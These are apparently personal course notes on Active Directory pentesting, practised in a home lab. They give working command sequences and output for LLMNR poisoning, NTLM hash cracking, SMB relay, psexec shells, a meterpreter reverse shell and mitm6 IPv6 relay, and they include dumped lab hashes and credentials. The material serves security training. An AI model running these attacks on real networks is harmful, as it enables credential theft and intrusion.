# Active Directory

*Note: This documentation is mostly made from my notes on [TCM Security Academy](https://academy.tcm-sec.com/)  
It will be complemented with notes from my practice and from other classes like the one from [HTB Academy](https://academy.hackthebox.com/)*

## Physical Components

### Domain Controllers
![Domain Controllers](../.res/domain-controllers.png)

### AD DS Data Store
When compromising AD we want to grab this file, it contains everything users objects groups password hashes for all the users etc…  
![AD DS Data Store](../.res/adds-datastore.png)


## Logical Components

Domain => Tree => Forest

### AD DS Schema
![AD DS Data Schema](../.res/adds-schema.png)

### Domains
![Domains](../.res/domains.png)

### Trees
![Trees](../.res/trees.png)

### Forests
![Forests](../.res/forests.png)

### Organizational Units (Ous)
![Organizational Units (Ous)](../.res/ous.png)

### Trusts
![Trusts](../.res/trusts.png)

### Objects
![Objects](../.res/objects.png)
- Domain are used to manage objects in an org
- If multiple domain, we have a tree
- If multiple set of trees we have a forest
- Across forest or across domain we have trust

## Resources to make your own practice lab

*Note: If you want a nice crash course about Active Directory (with the lab setup) I really recommend this one by [TCM-Security Academy](https://academy.tcm-sec.com/p/practical-ethical-hacking-the-complete-course)*

- [Microsoft Evaluation Center](https://www.microsoft.com/en-us/evalcenter/)
- [Windows 10](https://www.microsoft.com/en-us/evalcenter/evaluate-windows-10-enterprise)
- [Windows Server 2019](https://www.microsoft.com/en-us/evalcenter/evaluate-windows-server-2019)  
  *Note: To unlock Win Server 2019 and access the login screen from virtual box, the combinaison is ctrl+suppr*
- [Kali Linux](https://www.kali.org/)

## Attacking Active Directory

### LLMNR Poisoning

#### Responder

- [Impacket](https://github.com/SecureAuthCorp/impacket): tool to abuse LLMNR:  
Best to run first thing in the morning  
```responder -I eth0 -rdwv```
And when there will be activity in the network we will be able to get hashes

#### Hascat

- We use hashcat to crack the hashes we got previously
- When looking for a module in hascat we can grep on the hash we need:
```hashcat --help | grep NTLM```
- Command
```hashcat -m 5600 ntlmhash.txt /usr/share/wordlists/rockyou.txt```

### SMB Relay Attacks

#### Discovering hosts
- Possible with [Nessus](https://www.tenable.com/products/nessus)
- With [Nmap](https://nmap.org/)
```nmap --script=smb2-security-mode.nse -p445 10.0.2.0/24```
Example of what we get with this scan:
```
┌──(root💀kali)-[/home/kali]
└─# nmap --script=smb2-security-mode.nse -p445 10.0.2.0/24    
Starting Nmap 7.92 ( https://nmap.org ) at 2022-01-29 16:36 EST
[STRIPPED]

Nmap scan report for 10.0.2.4
Host is up (0.00062s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds
MAC Address: 08:00:27:FC:72:E9 (Oracle VirtualBox virtual NIC)

Host script results:
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled but not required

Nmap scan report for 10.0.2.5
Host is up (0.00052s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds
MAC Address: 08:00:27:7F:90:90 (Oracle VirtualBox virtual NIC)

Host script results:
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled and required

Nmap scan report for 10.0.2.15
Host is up (0.00059s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds
MAC Address: 08:00:27:AE:C1:68 (Oracle VirtualBox virtual NIC)

Host script results:
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled but not required

[STRIPPED]

Nmap done: 256 IP addresses (5 hosts up) scanned in 28.67 seconds
```
The domain controller has `enable` and `required`, we wont relay on this machine.

#### Attack 1st way

- In responder config (Responder.conf) we put http and smb on off
- Responder command
```responder -I eth0 -rdwv```
- Launch ntlmrelayx.py (our target ips are in targets.txt)
```ntlmrelayx.py -tf targets.txt -smb2support```
- We should get som hashes on our kali
```
[*] Done dumping SAM hashes for host: 10.0.2.4
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:25e61d7e5702c678e3be8711c03b7837:::
Jessica Jones:1001:aad3b435b51404eeaad3b435b51404ee:c39f2beb3d2ec06a62cb887fb391dee0:::
```

#### Attack 2nd way

- We launch Responder (with http and smb off), we launch ntlmrelayx.py just like befor but with -i to try to get an interactive shell.
```ntlmrelayx.py -tf targets.txt -smb2support -i```

- It should work and mention that we got a shell
```
[*] Servers started, waiting for connections
[*] SMBD-Thread-3: Received connection from 10.0.2.15, attacking target smb://10.0.2.4
[*] Authenticating against smb://10.0.2.4 as MARVEL\fcastle SUCCEED
[*] Started interactive SMB client shell via TCP on 127.0.0.1:11000
[STRIPPED]
```

- We can netcat to get the shell:
```nc 127.0.0.1 11000```
- We have an smb shell:
```
└─# nc 127.0.0.1 11000                                        
Type help for list of commands
# help

open {host,port=445} - opens a SMB connection against the target host/port
login {domain/username,passwd} - logs into the current SMB connection, no parameters for NULL connection. If no password specified, it'll be prompted
kerberos_login {domain/username,passwd} - logs into the current SMB connection using Kerberos. If no password specified, it'll be prompted. Use the DNS resolvable domain name
login_hash {domain/username,lmhash:nthash} - logs into the current SMB connection using the password hashes
logoff - logs off
shares - list available shares
use {sharename} - connect to an specific share
cd {path} - changes the current directory to {path}
lcd {path} - changes the current local directory to {path}
pwd - shows current remote directory
password - changes the user password, the new password will be prompted for input
ls {wildcard} - lists all the files in the current directory
rm {file} - removes the selected file
mkdir {dirname} - creates the directory under the current path
rmdir {dirname} - removes the directory under the current path
put {filename} - uploads the filename into the current path
get {filename} - downloads the filename from the current path
mount {target,path} - creates a mount point from {path} to {target} (admin required)
umount {path} - removes the mount point at {path} without deleting the directory (admin required)
info - returns NetrServerInfo main results
who - returns the sessions currently connected at the target host (admin required)
close - closes the current SMB Session
exit - terminates the server process (and this session)
# shares
ADMIN$
C$
IPC$
Share
# use C$
# ls
drw-rw-rw-          0  Fri Jan 28 19:29:18 2022 $Recycle.Bin
drw-rw-rw-          0  Fri Jan 28 20:21:23 2022 Documents and Settings
-rw-rw-rw-       8192  Sat Jan 29 16:14:20 2022 DumpStack.log.tmp
-rw-rw-rw- 1543503872  Sat Jan 29 16:14:20 2022 pagefile.sys
drw-rw-rw-          0  Fri Jan 28 20:18:41 2022 PerfLogs
drw-rw-rw-          0  Fri Jan 28 17:29:12 2022 Program Files
drw-rw-rw-          0  Fri Jan 28 20:18:41 2022 Program Files (x86)
drw-rw-rw-          0  Fri Jan 28 19:26:15 2022 ProgramData
drw-rw-rw-          0  Fri Jan 28 20:21:29 2022 Recovery
drw-rw-rw-          0  Fri Jan 28 19:33:38 2022 Share
-rw-rw-rw-  268435456  Sat Jan 29 16:14:20 2022 swapfile.sys
drw-rw-rw-          0  Fri Jan 28 17:21:44 2022 System Volume Information
drw-rw-rw-          0  Fri Jan 28 19:28:21 2022 Users
drw-rw-rw-          0  Fri Jan 28 17:23:30 2022 Windows
#
```
*Note: ntlmrelayx.py is really powerfull and has many commands, we could even launch other shells.*

### Shell Access

#### SMB - PSExec

##### With Metasploit

```msfconsole```
- we can seach psexec or type:
```use exploit/windows/smb/psexec```
```show options```
- We need to set rhosts, lhost, smbdomain, smbpass and smbuser
- We also need to set the payload depending on our target for instance `windows/x64/meterpreter/reverse_tcp`
- We should get a shell
```
[*] Started reverse TCP handler on 10.0.2.8:4444 
[*] 10.0.2.4:445 - Connecting to the server...
[*] 10.0.2.4:445 - Authenticating to 10.0.2.4:445|marvel.local as user 'fcastle'...
[*] 10.0.2.4:445 - Selecting PowerShell target
[*] 10.0.2.4:445 - Executing the payload...
[+] 10.0.2.4:445 - Service start timed out, OK if running a command or non-service executable...
[*] Sending stage (200262 bytes) to 10.0.2.4
[*] Meterpreter session 1 opened (10.0.2.8:4444 -> 10.0.2.4:51468 ) at 2022-02-04 10:28:51 -0500

meterpreter > 
```
##### With Impacket - psexec.py

Can be useful if meterprer is picked up by AV.
```
┌──(kali㉿kali)-[~]
└─$ psexec.py marvel.local/fcastle:Password1@10.0.2.4                                                                                                                                                                                    1 ⨯
Impacket v0.9.19 - Copyright 2019 SecureAuth Corporation

[*] Requesting shares on 10.0.2.4.....
[*] Found writable share ADMIN$
[*] Uploading file OKJXcwkr.exe
[*] Opening SVCManager on 10.0.2.4.....
[*] Creating service tDbW on 10.0.2.4.....
[*] Starting service tDbW.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.19044.1288]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32>
```
- We can also try with: wmbexec.py or wmiexec.py (same command except for name of the script of course)

###  IPv6 Attacks

There's no dns for IPv6 (only for IPv4) so we can spoof it with mitm6

#### Mitm6

- Fetch it [here](https://github.com/dirkjanm/mitm6)
- mitm6 command
```mitm6 -d domain-name.local```
- ntlmrelay
```ntlmrelayx.py -6 -t ldaps://DOMAIN-CONTROLLER-IP -wh fakewpad.domain.local -l lootme```
- Once the attack is successful we get a folder lootme with plenty of info from the DC
- If during the attack and admin logs in win 10 machine, mitm6 will create a new user for us:
```[*] Adding new user with username: YrAjkDnwzM and password: SHq]d(88dr%5+3R result: OK```

##### Mitm6 - Resources

- [Mitm6](https://blog.fox-it.com/2018/01/11/mitm6-compromising-ipv4-networks-via-ipv6/)
- [Combining NTLM Relaying and Kerberos delegation](https://dirkjanm.io/worst-of-both-worlds-ntlm-relaying-and-kerberos-delegation/)

### Passback Attacks

- [A Pen Tester’s Guide to Printer Hacking](https://www.mindpointgroup.com/blog/how-to-hack-through-a-pass-back-attack/)

## Quick Recap

- Useful tool to install in kali is https://github.com/Dewalt-arch/pimpmykali 
- First thing to do is launch responder (along with scans to generate traffic)
- LLMNR Poisoning
- SMB Relay Attack
- Look for websites in scope
- Check for default credentials (printers, tomcat, jenkins,...)